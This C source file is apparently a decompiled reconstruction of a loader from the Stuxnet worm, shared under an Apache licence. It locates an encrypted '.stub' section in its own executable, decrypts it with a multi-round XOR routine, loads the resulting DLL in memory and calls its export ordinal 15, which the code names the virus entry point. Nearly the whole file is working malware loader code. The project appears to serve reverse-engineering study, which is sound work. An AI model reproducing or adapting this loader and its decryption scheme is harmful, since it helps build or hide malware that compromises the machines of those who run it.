/******************************************************************************************
  Copyright 2012 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "2. STUBHandler.h"

// 99% (C) CODE MATCH
void LoadSTUBSection(void)
{
	FARPROC pVirusExecEntry; // eax@3
	INT32 pSectionVirtualSize; // [sp+0h] [bp-Ch]@1
	DWORD *pSectionSTUB; // [sp+4h] [bp-8h]@1
	HMODULE hVirusModule; // [sp+8h] [bp-4h]@2

	/* --->> Get the ".stub" section's RVA and Virtual Sizee <<--- */
	if(!LocateSTUBSection((PVOID *)&pSectionSTUB, &pSectionVirtualSize)) return;
	
	/* --->> Start to decrypt from the 552 byte <<--- */
	/* --->> Decrypt 49.8176 bytes <<--- */
	DecryptSTUBSection((char *)(pSectionSTUB[0] + (UINT32)pSectionSTUB), pSectionSTUB[1]);// (552, 498176)
	if(!Setup(NULL, (PVOID)(*pSectionSTUB + (UINT32)pSectionSTUB), pSectionSTUB[1], &hVirusModule)) // (0, 552, 498176, ...)
	{
		pVirusExecEntry = GetProcAddress(hVirusModule, (LPCSTR)15);
		if(pVirusExecEntry)
			((__tLibraryExecEntry)pVirusExecEntry)((DWORD)pSectionSTUB, pSectionVirtualSize);
		
		FreeLibrary(hVirusModule);
	}
}

// 98% (C) CODE MATCH
void DecryptSTUBSection(char *pSectionSTUB, UINT32 pSectionVirtualSize)
{
	UINT32 iFirstXOR; // edx@2
	UINT32 iSecondXOR; // eax@4
	UINT32 i;
	INT32 iTotalCycles; // [sp+8h] [bp-8h]@1
	UINT32 iCyclesSecondXOR; // [sp+Ch] [bp-4h]@1

	iCyclesSecondXOR = pSectionVirtualSize / 2;
	iTotalCycles = 4;
	do
	{
		iFirstXOR = 0;
		if(pSectionVirtualSize)
		{
			do
			{
				pSectionSTUB[iFirstXOR] ^= -106 * iFirstXOR;
				++iFirstXOR;
			}
			while(iFirstXOR < pSectionVirtualSize);
		}
		
		iSecondXOR = 0;
		if(iCyclesSecondXOR)
		{
			do
			{
				pSectionSTUB[iSecondXOR] ^= *(&pSectionSTUB[(pSectionVirtualSize + 1) / 2] + iSecondXOR);
				++iSecondXOR;
			}
			while(iSecondXOR < iCyclesSecondXOR);
		}
		
		for(i = pSectionVirtualSize - 1; i >= 1; --i)
			pSectionSTUB[i] -= pSectionSTUB[i - 1];
		
		--iTotalCycles;
	}
	while(iTotalCycles >= 0);
}

// 85% (C) CODE MATCH -> NEED DEBUG
BOOL LocateSTUBSection(PVOID *pRawSectionSTUB, INT32 *pSectionVirtualSize)
{
	PIMAGE_NT_HEADERS pImageNT; // esi@3
	PIMAGE_SECTION_HEADER pImageSection; // edi@5
	INT32 iCurrentSection; // ebx@5
	UINT32 iSectionVirtualSize; // ecx@10
	UINT32 *pSectionSTUB; // eax@11

	/* --->> Check executable header "MZ" <<--- */
	if(((PIMAGE_DOS_HEADER)hINSTANCE)->e_magic != MZ_HEADER)
		return FALSE;
	
	/* --->> Get the address of the new executable header <<--- */
	pImageNT = (PIMAGE_NT_HEADERS)((DWORD)hINSTANCE + ((PIMAGE_DOS_HEADER)hINSTANCE)->e_lfanew); // (hINSTANCE + 240)
	
	/* --->> Check new executable header "PE" <<--- */
	if(pImageNT->Signature != PE_HEADER)
		return FALSE;
	
	/* --->> Get the address of the PE Section Table <<--- */
	pImageSection = (PIMAGE_SECTION_HEADER)(pImageNT->FileHeader.SizeOfOptionalHeader + (DWORD)pImageNT + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD)); // (PE header + 224 + 24)
	iCurrentSection = 0;
	
	/* --->> Get the number of sections (5), if it is 0 or negative the function fails <<--- */
	if(pImageNT->FileHeader.NumberOfSections <= 0)
		return FALSE;
	
	/* --->> Search the section ".stub" where the encrypted dll is allocated, if not found the function failed <<--- */
	while(lstrcmpiA((LPCSTR)pImageSection->Name, ".stub"))
	{
		++iCurrentSection;
		++pImageSection; // Next section
		
		if(iCurrentSection >= pImageNT->FileHeader.NumberOfSections) return FALSE;
	}
	
	/* --->> Get the ".stub" section Virtual Size <<--- */
	iSectionVirtualSize = pImageSection->SizeOfRawData; // (503.808 bytes)
	
	/* --->> Check if the Virtual Size is not too small (VirtualSize < 556)             <<--- */
	if(iSectionVirtualSize < STUB_HEADER_LEN)
		return FALSE;
	
	/* --->> Get the ".stub" section RVA (Relative Virtual Address) (hINSTANCE + 0x6000) <<--- */
	/* --->> Check the header (DWORD) of the RVA section (0xAE39120D)                    <<--- */
	pSectionSTUB = (UINT32 *)((UINT32)hINSTANCE + pImageSection->VirtualAddress);
	if(*pSectionSTUB != STUB_INTEGRITY_MARK)
		return FALSE;
	
	/* --->> Remove the header (4 bytes) and put the values in the pointers <<--- */
	*pRawSectionSTUB     = pSectionSTUB++;
	*pSectionVirtualSize = iSectionVirtualSize - sizeof(UINT32);
	
	return TRUE;
}